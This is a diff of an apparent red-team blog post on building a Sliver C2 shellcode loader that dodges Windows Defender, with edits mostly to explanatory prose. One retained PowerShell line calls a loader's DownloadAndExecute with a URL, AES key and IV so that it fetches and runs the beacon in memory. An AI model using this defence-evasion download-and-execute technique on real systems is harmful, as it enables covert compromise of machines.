@@ -13,11 +13,13 @@ categories: ['Maldev', 'Windows', 'Homelab']
 My recent exploration into C2 frameworks led me to BishopFox's [Sliver](https://github.com/BishopFox/sliver) project. While its capabilities are impressive, I quickly encountered a common challenge: Windows Defender's swift detection of beacon payloads on my Windows VM. In order to enhance my red teaming skills, I decided to dig into leveraging [DInvoke](https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main), [FilelessPELoader](https://github.com/SaadAhla/FilelessPELoader) and several evasion techniques for building my own Sliver shellcode loader.
 
 ## What is a shellcode loader?
-A shellcode loader is a small piece of executable code designed to, as its name would suggest, load and execute shellcode (being a larger payload) into a target process's memory. Think of it as the initial delivery mechanism. Shellcode loaders are often go along with techniques like process injection, allowing attackers to run arbitrary code within a legitimate process, that bypass traditional security controls focused on executable files on disk.
+A shellcode loader is a small piece of executable code designed to, as its name would suggest, load and execute shellcode (being a larger payload) into a target process's memory. Think of it as the initial delivery mechanism. Shellcode loaders often go along with techniques like process injection, allowing attackers to run arbitrary code within a legitimate process, that bypass traditional security controls focused on executable files on disk.
 
-The loader will act as a **Stage 1** payload (a.k.a. stagers). Its primary purpose is to establish communication with a command and control (C2) or payload server and download the larger, more feature-rich **Stage 2** payload. The second stage payload is the main malicious code that we as an attacker intend to execute on the target system. For this blog post our final payload will be a Sliver beacon.
+The loader will act as a **Stage 1** payload (e.g. `stager.txt`). Its primary purpose is to establish communication with a command and control (C2) or payload server and download the larger, more feature-rich (and often encrypted) **Stage 2** payload. The second stage payload is the main malicious code that we as an attacker intend to execute on the target system. 
 
-The goal is to create a stager with the following properties:
+![Stager diagram](/assets/images/maldev/stager-diagram.png)
+
+For this blog post our final payload will be a Sliver beacon. The goal is to create a stager with the following properties:
 1. Natively supported by Windows without too much dependencies.
 2. Bypass common defenses found on modern operating systems (e.g. signature checks).
 3. Use commonly whitelisted protocols in order to bypass firewall rules and fit in with normal traffic (e.g. web traffic).
@@ -221,7 +223,7 @@ $CompressionAlgorithm = "deflate9"
 [serpent.Loader]::DownloadAndExecute($url,$TargetBinary,$CompressionAlgorithm,$AESKey,$AESIV)
 ```
 
-This script is a PowerShell loader that is hosted on our server, intented to be downloaded and executed once an attacker gains code execution. The script will load the stager into memory via reflection and performs the `DownloadAndExecute` operation of the agent from the staging server.
+This script is a PowerShell loader that is hosted on our server, intented to be downloaded and executed once an attacker gains code execution. The script will load the stager into memory via reflection and performs the `DownloadAndExecute` operation that downloads our Sliver agent from our payload server and executes it.
 
 ## Sliver in Action
 Moving to our attack machine, we run our Python HTTP server where our shellcode is located.
